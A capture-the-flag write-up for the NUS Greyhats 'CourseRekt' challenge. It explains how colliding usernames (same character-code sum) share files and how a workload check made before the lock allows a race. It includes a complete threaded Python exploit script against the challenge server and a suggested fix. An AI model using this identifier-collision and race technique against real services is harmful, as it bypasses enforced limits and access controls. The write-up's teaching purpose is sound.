# CourseRekt — NUS Greyhats CTF Writeup

## Challenge overview

CourseRekt lets users select modules and apply for graduation.

~~~python
MAX_WORKLOAD = 23
MCS_REQUIRED = 160
MCS_TAKEN = 136
~~~

## Why the maximum is 23 MCs

Graduation requires 160 MCs. The user already has 136 MCs, so they need:

~~~text
160 - 136 = 24 MCs
~~~

Normal modules are worth 4 MCs. The 23-MC limit prevents a normal user from selecting six modules:

~~~text
5 × 4 = 20 MCs
6 × 4 = 24 MCs  # rejected
~~~

The check is:

~~~python
if workload + MODULE_WORKLOAD[mod_code] > MAX_WORKLOAD:
    return False
~~~

## Username collision

User files are stored using the sum of the username's character codes:

~~~python
def user_id():
    return sum(ord(char) for char in USERNAME)
~~~

These usernames are different but all have ID 154:

~~~text
AY = 65 + 89 = 154
BX = 66 + 88 = 154
CW = 67 + 87 = 154
DV = 68 + 86 = 154
EU = 69 + 85 = 154
FT = 70 + 84 = 154
~~~

They therefore share:

~~~text
data/154/MODS.txt
data/154/WORKLOAD.txt
~~~

## Race condition

The workload is read and checked before the lock is acquired:

~~~python
with open(f"{uid}/WORKLOAD.txt", "r") as f:
    workload = float(f.read() or "0")

if workload + MODULE_WORKLOAD[mod_code] > MAX_WORKLOAD:
    return False

with open(f"{uid}/MODS.txt", "r+") as f:
    fcntl.lockf(f, fcntl.LOCK_EX)
~~~

Six concurrent connections can all read workload 0 before any process updates it. Each passes 0 + 4 <= 23, and the locked section then appends six modules to the shared MODS.txt.

The lock protects the file update, but it is acquired too late to protect the validation.

## Exploit script

The script first connects all six users and waits until they reach the menu. A threading.Barrier then releases all six module requests together.

~~~python
import socket
import threading

HOST = "challs.nusgreyhats.org"
PORT = 36172

users = ["AY", "BX", "CW", "DV", "EU", "FT"]
modules = [
    "CS1231", "CS2030", "CS2040",
    "CS2100", "CS2102", "CS2220",
]

sockets = [None] * 6
barrier = threading.Barrier(6)

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def setup(i):
    sock = socket.create_connection((HOST, PORT))
    sockets[i] = sock
    recv_until(sock, b"username:")
    sock.sendall((users[i] + "\n").encode())
    recv_until(sock, b"Your choice:")

def add_module(i):
    sock = sockets[i]
    barrier.wait()
    sock.sendall(b"1\n")
    recv_until(sock, b"module code:")
    sock.sendall((modules[i] + "\n").encode())
    recv_until(sock, b"Your choice:")

threads = [threading.Thread(target=setup, args=(i,)) for i in range(6)]
for t in threads:
    t.start()
for t in threads:
    t.join()

threads = [threading.Thread(target=add_module, args=(i,)) for i in range(6)]
for t in threads:
    t.start()
for t in threads:
    t.join()

sockets[0].sendall(b"3\n")

result = b""
while b"flag:" not in result and b"Not enough MCs!" not in result:
    chunk = sockets[0].recv(4096)
    if not chunk:
        break
    result += chunk

print(result.decode(errors="replace"))

for sock in sockets:
    sock.close()
~~~

Run it with:

~~~bash
python3 exploit.py
~~~

The six modules total 24 MCs, so the graduation check succeeds:

~~~text
24 + 136 = 160
~~~

## Fix

The workload read, validation, module update, and workload update should all happen under one lock. The username ID should also be replaced with a unique, collision-resistant identifier.

